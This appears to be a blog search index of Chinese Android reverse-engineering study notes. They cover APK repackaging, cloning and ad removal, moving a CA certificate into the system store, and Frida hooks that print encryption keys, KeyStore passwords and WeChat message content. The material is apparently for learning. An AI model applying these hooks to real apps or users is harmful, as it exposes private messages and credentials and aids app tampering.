<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>E:DownloadTyporaNotesAndroid知识点面试总结</title>
      <link href="/posts/31280829.html"/>
      <url>/posts/31280829.html</url>
      
        <content type="html"><![CDATA[<p><img src="assets/image-20250115121751160.png" alt="image-20250115121751160"></p><p><img src="assets/image-20250115122139233.png" alt="image-20250115122139233"></p><p><img src="assets/image-20250115122506738.png" alt="image-20250115122506738"></p><p><img src="C:/Users/%E5%8A%B3%E5%8A%B3/AppData/Roaming/Typora/typora-user-images/image-20250115122805650.png" alt="image-20250115122805650"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>apk基础修改练习</h1><h2 id="修改apk图标实现二次打包">修改apk图标实现二次打包</h2><ul><li>打开AndroidKiller，拖入Calc到AndKiller中，查看 AndroidManfest.xml 中图片</li></ul><p>资源的名称。<img src="assets/image-20230525222334668.png" alt="image-20230525222334668"></p><ul><li><p>在 MANIFEST.MF 中搜索关键字 ic_launcher.png 替换所有的 ic_launcher.png 为自</p><p>己的图片。其中 MANIFEST.MF 简单可以理解为对 apk 中所有文件和非文件进行摘要处理，</p><p>因此在此文件中可以找到我们的图标资源对应的路径，而图标的后缀一般情况下都</p><p>为.png。<img src="assets/image-20230525223257821.png" alt="image-20230525223257821"></p></li></ul><p><img src="assets/image-20230525224055700.png" alt="image-20230525224055700"></p><ul><li>替换所有的 ic_launcher.png 图标，有多个一样的图标是由于手机的不同分辨率导致了</li></ul><p>适配时要制作的启动页、大小不同，启动图标由于使用的设备不同也有大小的区别。根据搜索出来的地址锁定位置，替换/编辑这四个图标。</p><p><img src="assets/image-20230525224310372.png" alt="image-20230525224310372"></p><ul><li>回编译该 apk</li></ul><p><img src="assets/image-20230525224945692.png" alt="image-20230525224945692"></p><ul><li><p>删除之前安装的 apk，相同的 apk 会导致安装不上，具体的原因留在下篇文章讲解，有</p><p>兴趣的也可以下去提前了解下。安装好 apk 之后发现成功实现二次打包，完成本次实验。</p></li></ul><h2 id="修改apk包名实现分身">修改apk包名实现分身</h2><ol><li>首先将火柴人 apk 安装到模拟器，并将拖入 AndroidKiller,反编译完成 apk 后打开</li></ol><p>AndroidManifest.xml 文件<img src="assets/image-20230525233331747.png" alt="image-20230525233331747"></p><ol start="2"><li>在 AndroidManifest.xml 中的 manifest 标签中的 package 属性，这个属性后面的</li></ol><p>值 就 是 apk 的 包 名 ， 这 里 是 package=“com.miniclip.angerofstick2.yyh” ， 修 改</p><p>package 的 属 性 值 （ 不 要 改 为 中 文 ） ， 这 里 改 为 package=&quot;</p><p><a href="http://com.miniclip.angerofstick2.yyh.pro">com.miniclip.angerofstick2.yyh.pro</a> ”,然后还需要修改的是 provider,即内容提供者，</p><p>在 AndroidManifest.xml 中 搜 索 ” &lt;provider” ， 修 改 provider 标 签 里 面 的</p><p>android:authorities 这个属性的值，这里在原有的值后面全部加上 1，然后点击保存。</p><p><img src="assets/image-20230525234442367.png" alt="image-20230525234442367"></p><p><img src="assets/image-20230525234750141.png" alt="image-20230525234750141"></p><pre><code>3. 保存，回编译，安装，发现手机上成功装上两个一样的 app,并且可以正常运行。</code></pre><p>我回编译失败不知道为什么。</p><p>4.安装失败几种原因及解决办法</p><ul><li>第一种是只修改包名，会引起内容提供者冲突</li></ul><p>解决办法：修改配置文件中所有内容提供者“android:authorities&quot;属性的值</p><p>第二种是有些 apk 在内部使用了包名，只修改包名会导致程序崩溃</p><ul><li>解决办法：全局搜索包名，将所有的找到是包名的字符串进行替换。</li></ul><p>第三种是签名信息不同导致无法运行</p><ul><li>解决办法：使用同一签名工具对所有分身 apk 进行签名，即都用 androidkiller 回编译之</li></ul><p>后再安装</p><h2 id="修改apk名称">修改apk名称</h2><p>进行 apk 名称的修改这里介绍两种方式：</p><p>第一种：直接在工程搜索中全局搜索字符串“火柴人突击格斗”，替换所有“火柴人突击格斗”为“我的 app“<img src="assets/image-20230526000533751.png" alt="image-20230526000533751"></p><p>点击替换<img src="assets/image-20230526000640351.png" alt="image-20230526000640351"></p><p>回编译安装 apk就可以。</p><p>第二种：修改配置文件，直接固定 apk 的名称。因为 AndroidManifest.xml</p><p>是 apk 的 配 置 清 单 文 件 ， 所 以 可 以 直 接 修 改 这 个 文 件 进 行 篡 改 apk 的 名 称 。 在</p><p>AndroidManifest.xml 找 到 android:label ， 修 改 所 有 地 方 ， 这 里 改 成</p><p>android:label=“你的 app”,然后保存。<img src="assets/image-20230526134743213.png" alt="image-20230526134743213"></p><p>然后删除第一种方法安装的 apk,回编译安装此次修改的 apk就好</p><p><img src="assets/image-20230526134940488.png" alt="image-20230526134940488"></p><h2 id="修改apk资源实现去广告">修改apk资源实现去广告</h2><h3 id="开屏广告去除">开屏广告去除</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>xjb课程笔记</h1><h2 id="抓包基础">抓包基础</h2><p>全局抓包工具</p><p>代理抓包工具</p><p>本地目录E:\Android-tools\Android_Studio\AndroidSDK\tools\bin中有一个<strong>uiautomatorviewer.bat</strong>，用来观察安卓界面的组件是否是H5加密，如果是则抓包的数据是经过js加密的</p><ul><li>Android系统7.0及以上要把证书放到系统证书处。</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /data/misc/user/0/cacerts-added  <span class="comment">#移动至于用户证书目录</span></span><br><span class="line">mount -o remount,rw /system   <span class="comment">#将系统证书目录权限改成可读可写就可以移动文件不然不行</span></span><br><span class="line"><span class="built_in">cp</span> * /etc/security/cacerts/  <span class="comment">#这里可以使用cp也可以使用mv</span></span><br><span class="line">mount -o remount,ro /system  <span class="comment">#移动完之后记得把权限改回只读</span></span><br><span class="line"></span><br><span class="line">如果第二步报错，可以执行</span><br><span class="line">mount -o rw,remount -t auto /</span><br></pre></td></tr></table></figure><h2 id="xjb第九课">xjb第九课</h2><h3 id="代码分析">代码分析</h3><p>下载对应附件，然后在登录框输入用户名以及密码。</p><p>使用charles抓包，如下<img src="assets/image-20231117215151417.png" alt="image-20231117215151417"></p><p>然后使用uiautomatorviewer.bat工具查看控件不是H5加密的，所以载入jadx，然后搜索关键字user/login，跳转如下<img src="assets/image-20231117215337403.png" alt="image-20231117215337403"></p><p>然后观察login方法发现里面就是一些put方法，然后跟进para发现是一个Map类</p><p>然后para作为requestNetwork方法的参数，那么就看这个方法</p><p>发现这里引用para<img src="assets/image-20231117215622363.png" alt="image-20231117215622363"></p><p>跟进这个addRequestMap，如下正好发现了抓包时的一个关键字&quot;Encrypt&quot;<img src="assets/image-20231117215720332.png" alt="image-20231117215720332"></p><p>分析一下这个函数关键就是两个地方：paraMap和encodeDesMap</p><p>看一下paraMap<img src="assets/image-20231117215853832.png" alt="image-20231117215853832"></p><p>跟进这个函数<img src="assets/image-20231118143150954.png" alt="image-20231118143150954">据作者说有逆向经验就知道这是对数据进行签名。</p><p>这里关键就是看md5加密，所以builder.toString()就是没有进行md5加密前的一个数据，应该就是一个明文，那我们就要获取到他。</p><p>获取到了这个code参数后，在返回<img src="assets/image-20231118142642539.png" alt="image-20231118142642539"></p><p>看encodeDesMap方法</p><p><img src="assets/image-20231118142703827.png" alt="image-20231118142703827"></p><p>好像是一个加密，看一下DesSecurity这个类</p><p><img src="assets/image-20231118145147596.png" alt="image-20231118145147596">就是对seckey进行了md5加密，然后des加密</p><p>退回上一个函数</p><p>所以我们要知道data的值，才能进行一系列加密<img src="assets/image-20231118144712301.png" alt="image-20231118144712301">，</p><h3 id="解决方案">解决方案</h3><ul><li>smali插桩</li><li>jeb动态调试</li><li>frida/Xposed</li></ul><p>分别对<img src="assets/image-20231118171946666.png" alt="image-20231118171946666"></p><p>和</p><p><img src="assets/image-20231118172006494.png" alt="image-20231118172006494"></p><p>进行hook</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="comment">//hook encodeDesMap方法</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">RequestUtil</span>=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.dodonew.online.http.RequestUtil&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">RequestUtil</span>);</span><br><span class="line">    <span class="title class_">RequestUtil</span>.<span class="property">encodeDesMap</span>.<span class="title function_">overload</span>(<span class="string">&quot;java.lang.String&quot;</span>,<span class="string">&quot;java.lang.String&quot;</span>,<span class="string">&quot;java.lang.String&quot;</span>).<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">a,b,c</span>)&#123;    <span class="comment">//重载的构造</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;data：&quot;</span>,a);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desKey：&quot;</span>,b);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;desIV：&quot;</span>,c);</span><br><span class="line">        <span class="keyword">var</span> retval=<span class="variable language_">this</span>.<span class="title function_">encodeDesMap</span>(a,b,c);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval：&quot;</span>,retval);</span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//hook md5方法</span></span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">Utils</span>=<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.dodonew.online.util.Utils&#x27;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">Utils</span>);</span><br><span class="line">    <span class="title class_">Utils</span>.<span class="property">md5</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">a</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;MD5 String：&quot;</span>,a);</span><br><span class="line">        <span class="keyword">var</span> retval=<span class="variable language_">this</span>.<span class="title function_">md5p</span>(a);</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;retval：&quot;</span>,retval);</span><br><span class="line">        <span class="keyword">return</span> retval;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="xjb第13课时">xjb第13课时</h2><h3 id="java层快速定位">java层快速定位</h3><p>反汇编一个app搜不到关键字</p><ul><li>H5 APP加密      js加密，jadx反编译无效</li><li>字符串混淆/加密</li><li>app被加固</li></ul><p>例题：xjb第九课demo</p><ul><li>hook掉put函数</li></ul><p><img src="assets/image-20231119150421525.png" alt="image-20231119150421525"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">HashMap</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.util.HashMap&#x27;</span>)</span><br><span class="line">    <span class="title class_">HashMap</span>.<span class="property">put</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;HashMap：&#x27;</span>,a,b);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">put</span>(a,b);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><ul><li>打印调用堆栈（过滤一些内容）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//函数调用堆栈</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">showStacks</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> stack = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;android.util.Log&#x27;</span>).<span class="title function_">getStackTraceString</span>(<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;Java.lang.Throwable&#x27;</span>).$new());</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(stack);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">HashMap</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.util.HashMap&#x27;</span>)</span><br><span class="line">    <span class="title class_">HashMap</span>.<span class="property">put</span>.<span class="property">implementation</span>=<span class="keyword">function</span>(<span class="params">a,b</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(a == <span class="string">&#x27;username&#x27;</span>)&#123;</span><br><span class="line">            <span class="title function_">showStacks</span>()</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;HashMap：&#x27;</span>,a,b);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">put</span>(a,b);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="frida中使用try…catch…">frida中使用try…catch…</h2><ul><li><p>因为js中不能直接使用try…catch…，所以需要写个try…catch…的java脚本，拿出里面的dex，反编译dex，删除一些不必要的再重打包dex<img src="assets/image-20231119175416670.png" alt="image-20231119175416670"></p></li><li><p>adb push xxx.dex  /data/local/tmp</p></li><li><p>dex注入</p></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//写在J</span></span><br><span class="line">Java.openClassFile(<span class="string">&quot;/data/local/tmp/xxx.dex&quot;</span>).load(); <span class="comment">//然后就可以使用注入的这个类</span></span><br></pre></td></tr></table></figure><h2 id="xjb第27课时">xjb第27课时</h2><h3 id="抓包实战-加固型app">抓包实战(加固型app)</h3><h4 id="hook加固型app的大致方法">hook加固型app的大致方法</h4><ol><li>拿到加载应用本身dex的classloader(壳的类加载器)</li><li>通过这个classloader找到被加固的类</li><li>使用类去hook需要hook的方法</li></ol><h5 id="如何获取classloader">如何获取classloader</h5><p>找到attachBaseContext，执行它，然后拿到的classloader就是加载过加固dex的classloader</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> <span class="title class_">StubApp</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.stub.StubApp&#x27;</span>);</span><br><span class="line">   <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">StubApp</span>);</span><br><span class="line">   <span class="title class_">StubApp</span>.<span class="property">attachBaseContext</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">context</span>)&#123;</span><br><span class="line">       <span class="variable language_">this</span>.<span class="title function_">attachBaseContext</span>(context);  <span class="comment">//先运行 </span></span><br><span class="line">       <span class="keyword">var</span> classLoader = context.<span class="title function_">getClassLoader</span>(); <span class="comment">//获得壳类加载器</span></span><br><span class="line">       <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;classLoader: &#x27;</span>, classLoader);</span><br><span class="line">       <span class="title class_">Java</span>.<span class="property">classFactory</span>.<span class="property">loader</span> = classLoader; <span class="comment">//改变后面的类加载器</span></span><br><span class="line">       ....</span><br><span class="line">        </span><br></pre></td></tr></table></figure><h3 id="抓包实战-双向验证型app">抓包实战(双向验证型app)</h3><p>服务器验证客户端证书</p><p>一般情况下，assets下存在证书，我们要把它导入抓包工具如charles中。</p><p>因为证书中有私钥，所以导入时需要输入正确密码。</p><p>看关键函数<strong>keystore.load</strong></p><p>hook这个keystore.load</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">hook_KeyStore_load</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">StringClass</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;Java.lang.String&#x27;</span>);</span><br><span class="line">        <span class="keyword">var</span> <span class="title class_">KeyStore</span> = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;java.security.KeyStore&#x27;</span>);</span><br><span class="line">        <span class="title class_">KeyStore</span>.<span class="property">load</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.security.KeyStore$LoadStoreParameter&#x27;</span>).<span class="property">implementation</span> =<span class="keyword">function</span> (<span class="params">arg0</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;KeyStore.load1:&quot;</span>,arg0);</span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">load</span>(arg0);</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="title class_">KeyStore</span>.<span class="property">load</span>.<span class="title function_">overload</span>(<span class="string">&#x27;java.io.InputStream&#x27;</span>,<span class="string">&#x27;[C&#x27;</span>).<span class="property">implementation</span> =<span class="keyword">function</span> (<span class="params">arg0,arg1</span>)&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;KeyStore.load2:&quot;</span>,arg0,arg1?<span class="title class_">String</span>.$new(arg1):<span class="literal">null</span>);<span class="comment">//输出arg1字符串形式</span></span><br><span class="line">            <span class="variable language_">this</span>.<span class="title function_">load</span>(arg0,arg1);</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;hook_KeyStore_load...&#x27;</span>);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">hook_KeyStore_load</span>();</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/posts/0.html"/>
      <url>/posts/0.html</url>
      
        <content type="html"><![CDATA[<h1>微信app简单逆向学习</h1><ul><li>小记：没有逆向过什么正式app，翻阅哲佬博客看到了微信逆向的实战，之前看到就望而却步了，最近没什么事情就尝试复现了一下，也只能是懂了一点却又没完全弄懂</li></ul><h2 id="vx-Log日志输出">vx Log日志输出</h2><p>像这种大型的app都会自己包装一个Log类，用于开发过程中的Log输出调式，而正式发布后都会关闭这些Log类输出，所以我们可以找到关闭log类输出的方法打开它，利于我们后面逆向分析</p><p>简单看一下反编译后的代码，发现打印输出有些是ae.x这种结构的，跟进ae类看一下。看一下里面有没有什么特殊的方法名<br><img src="assets/image-20240609144316609.png" alt="image-20240609144316609"></p><p>看这个名字应该是控制Log开关的方法。看看哪里引用了这个函数，跟进到keep_setupXLog()方法。</p><p><img src="assets/image-20240609144528529.png" alt="image-20240609144528529"></p><p>发现是setConsoleLogOpen()的参数控制Log的开关，而这个参数又是keep_setupXLog()的第六个参数，所以只要hook把这个参数变为true应该就可以了。选择hook keep_setupXLog()修改参数值。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.xlog.app.XLogSetup&#x27;</span>);</span><br><span class="line">    clazz.<span class="property">keep_setupXLog</span>.<span class="title function_">overload</span>(<span class="string">&#x27;boolean&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>, <span class="string">&#x27;java.lang.Integer&#x27;</span>, <span class="string">&#x27;java.lang.Boolean&#x27;</span>, <span class="string">&#x27;java.lang.Boolean&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">p0,p1,p2,p3,p4,p5,p6</span>) &#123;</span><br><span class="line">        <span class="variable language_">arguments</span>[<span class="number">5</span>] = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;java.lang.Boolean&quot;</span>).<span class="property">TRUE</span>.<span class="property">value</span>;  <span class="comment">//修改为true</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;已开启vx Log打印&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> clazz.<span class="property">keep_setupXLog</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);   <span class="comment">//运行函数(参数被修改后的)</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>修改后我尝试使用Android Studio的Logcat看看有没有输出发现没有输出，看哲佬笔记发现了Log缓存目录啥的打开时乱码也没有管，但是这个对后面的分析没有太大的影响，这里就理解理解一下思路吧。</p><h2 id="vx发送消息">vx发送消息</h2><h3 id="分析">分析</h3><p>这种思路就是定位关键方法位置，这里采用DDMS记录一下点击消息框“发送”按钮后方法的调用栈。</p><p>打开DDMS，选中进程，然后点击Start Method Profiling进行跟踪记录。</p><p>同时测试机点击发送按钮，然后关闭跟踪记录<br><img src="assets/image-20240609145348157.png" alt="image-20240609145348157"></p><p>然后会出现如下窗口</p><p><img src="assets/image-20240609145650911.png" alt="image-20240609145650911"></p><p>搜索一下onClick方法就可以，不知道为什么我这DDMS不能方法搜索(感觉自己前期环境配置的真的烂)</p><p>定位到 <strong>com.tencent.mm.pluginsdk.ui.chat.ChatFooter$7</strong></p><p>然后gda看一下这个类下的代码</p><p><img src="assets/image-20240609150036985.png" alt="image-20240609150036985"></p><p>这里挺明显的，“empty message cant be sent”,而上面是判断str是否空，所以猜测str就是用户输入的消息，hook一下有str作为参数的方法，打印一下参数应该就可以了(这里可以hook的方法不唯一，都可以实现)</p><p>这里hook这个方法</p><p><img src="assets/image-20240609150443141.png" alt="image-20240609150443141"></p><p>hook代码如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">//console.log(&quot;aaa&quot;);</span></span><br><span class="line">    <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.pluginsdk.ui.chat.ChatFooter&#x27;</span>);</span><br><span class="line">    clazz.<span class="property">a</span>.<span class="title function_">overload</span>(<span class="string">&#x27;com.tencent.mm.pluginsdk.ui.chat.ChatFooter&#x27;</span>, <span class="string">&#x27;java.lang.String&#x27;</span>).<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Send Message&quot;</span>,<span class="variable language_">arguments</span>[<span class="number">1</span>]); </span><br><span class="line">        <span class="keyword">return</span> clazz.<span class="property">a</span>.<span class="title function_">apply</span>(<span class="variable language_">this</span>, <span class="variable language_">arguments</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>效果：</p><p><img src="assets/image-20240609150547432.png" alt="image-20240609150547432"></p><h2 id="修改vx消息内容">修改vx消息内容</h2><h3 id="定位">定位</h3><p>还是首先定位关键方法，这里使用ddms自带的ui识别工具(ui识别的工具我是真的用都用不了)，说一下大致方法</p><p>测试机打开到与用户聊天界面，使用<code>Dump View Hierarchy for UI Automator</code>来定位发送的消息的控件ID</p><p>控件ID格式为<code>com.tencent.mm:id/al9</code>，然后使用命令行<code>adb shell dumpsys activity top</code>列出当前界面的各种activity类(界面还是与用户聊天界面)，然后搜索控件id就会精准定位到一个类</p><p><img src="assets/image-20240609151254311.png" alt="image-20240609151254311"></p><p>gda跟进进行分析 <code>com.tencent.mm.ui.chatting.view.MMChattingListView</code></p><h3 id="分析-2">分析</h3><p>翻一下就会找到setAdapter方法(逆向这种业务app感觉真的吃开发功底，而自己不咋懂开发…)</p><p><img src="assets/image-20240609151535307.png" alt="image-20240609151535307"></p><p>看了哲佬的Android笔记发现这里可能就是给ListView设置了一个适配器，而this.LNy就是Adapter，类型为BaseAdapter。交叉引用看看哪里使用了setAdapter方法，发现fTJ方法</p><p><img src="assets/image-20240609153639603.png" alt="image-20240609153639603"></p><p>Lrn是适配器，类型为com.tencent.mm.ui.chatting.a.a；</p><p>Lrr是ListView，类型为MMChattingListView</p><p>Lrn是a类型，跟进这个com.tencent.mm.ui.chatting.a.a类看看，这个类应该是对adapter的编写实现啥的。</p><p>找到编写adapter中关键的几个方法，如getCount</p><p><img src="assets/image-20240609154016621.png" alt="image-20240609154016621"></p><p>根据一般getCount实现的编写，可以知道LtF是数据源。</p><p>我们可以调用<code>getCount()</code>方法和<code>getItem()</code>获取到数据源的单个数据</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">adapter</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> clazz = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&#x27;com.tencent.mm.ui.chatting.ChattingUIFragment&#x27;</span>);</span><br><span class="line">        clazz.<span class="property">zt</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;this.Lrn.value&quot;</span>,<span class="variable language_">this</span>.<span class="property">Lrn</span>.<span class="property">value</span>); <span class="comment">//获得Lrn的值 Lrn是 适配器</span></span><br><span class="line">            <span class="comment">//创建适配器对象，操作getCount  getItem</span></span><br><span class="line">            <span class="keyword">var</span> adapter = <span class="title class_">Java</span>.<span class="title function_">cast</span>(<span class="variable language_">this</span>.<span class="property">Lrn</span>.<span class="property">value</span>,<span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.tencent.mm.ui.chatting.a.a&quot;</span>))</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;adapter&quot;</span>,adapter);</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;adapter.getCount&quot;</span>,adapter.<span class="title function_">getCount</span>());</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;LtF&quot;</span>,adapter.<span class="property">LtF</span>.<span 